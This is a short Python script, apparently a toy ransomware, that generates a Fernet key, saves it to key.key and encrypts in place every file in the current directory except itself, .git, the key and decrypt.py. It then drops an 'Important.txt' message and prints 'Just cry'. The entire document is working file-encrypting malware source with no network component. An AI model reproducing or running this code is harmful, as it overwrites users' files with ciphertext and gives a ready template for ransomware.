import os
from cryptography.fernet import Fernet


key = Fernet.generate_key()

with open("key.key",'wb') as theKey:
    theKey.write(key)


for file in os.listdir():
    if file == "crypto.py" or file == ".git" or file == "key.key" or file == "decrypt.py":
        continue
    else:
        with open(file,"rb") as fl:
            data = fl.read()
    
        with open(file,"wb") as fl:
            data = Fernet(key).encrypt(data)
            fl.write(data)
            
with open('Important.txt','wt') as rd:
    rd.write("ta7ya wlad tizi")

print("Just cry")